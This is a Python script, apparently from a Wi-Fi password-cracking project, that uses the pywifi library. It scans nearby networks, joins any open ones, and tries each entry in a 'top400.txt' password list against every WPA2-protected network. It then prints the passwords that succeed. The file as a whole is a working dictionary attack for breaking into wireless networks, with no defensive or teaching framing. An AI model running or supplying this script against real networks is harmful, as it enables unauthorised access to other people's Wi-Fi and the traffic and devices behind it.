

import time
import pywifi
from pywifi import const
from colorama import Fore, Style, init
import os

# Initialize colorama
init(autoreset=True)

# Initialize variables
available_devices = []
keys = []
final_output = {}

# Function to scan for Wi-Fi networks
def scan_networks(interface):
    interface.scan()
    time.sleep(5)  # Wait for the scan to complete
    networks = interface.scan_results()
    return [network.ssid for network in networks if network.ssid]  # Filter out empty SSIDs

# Function to attempt connecting to an open network
def connect_open_network(interface, ssid):
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_NONE)
    interface.remove_all_network_profiles()
    interface.add_network_profile(profile)
    interface.connect(profile)
    time.sleep(4)
    return interface.status() == const.IFACE_CONNECTED

# Function to attempt connecting to a secured network with a password
def connect_secured_network(interface, ssid, password):
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    interface.remove_all_network_profiles()
    interface.add_network_profile(profile)
    interface.connect(profile)
    time.sleep(4)
    return interface.status() == const.IFACE_CONNECTED

# Main function
def main():
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]  # Assuming a single Wi-Fi interface
    print(f"{Fore.CYAN}Interface Name: {interface.name()}{Style.RESET_ALL}")

    # Step 1: Scan for available networks
    available_devices = scan_networks(interface)
    print(f"\n{Fore.YELLOW}Available Networks:{Style.RESET_ALL}")
    for ssid in available_devices:
        print(f"{Fore.GREEN}Host Name => {ssid}{Style.RESET_ALL}")

    # Step 2: Try to connect to open networks
    for ssid in available_devices[:]:
        if connect_open_network(interface, ssid):
            print(f"{Fore.GREEN}Success: Open network {ssid} has no password{Style.RESET_ALL}")
            final_output[ssid] = "None"
            available_devices.remove(ssid)

    # Step 3: Attempt to read the password list file
    try:
        with open(r'C:\Users\sk\Desktop\New folder (3)\python-wifi-password-cracking-master\top400.txt', 'r') as f:
            keys = [line.strip() for line in f]
    except FileNotFoundError:
        print(f"{Fore.RED}Error: 'top400.txt' file not found. Please make sure the file exists.{Style.RESET_ALL}")
        return

    # Step 4: Try to connect to secured networks using the password list
    for ssid in available_devices:
        for password in keys:
            print(f"Trying password: {Fore.BLUE}{password}{Style.RESET_ALL} for SSID: {Fore.YELLOW}{ssid}{Style.RESET_ALL}")
            if connect_secured_network(interface, ssid, password):
                print(f"{Fore.GREEN}Success: Password of the network {ssid} is {password}{Style.RESET_ALL}")
                final_output[ssid] = password
                break
            else:
                print(f"{Fore.RED}Failed: {password} did not work for {ssid}{Style.RESET_ALL}")

    # Display the discovered passwords
    print(f"\n{Fore.CYAN}{'*' * 10} Discovered Passwords {'*' * 10}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'HOST NAME':<12} {'PASSWORD':<}{Style.RESET_ALL}")
    for ssid, password in final_output.items():
        print(f"{Fore.GREEN}{ssid:<12} {password:<}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
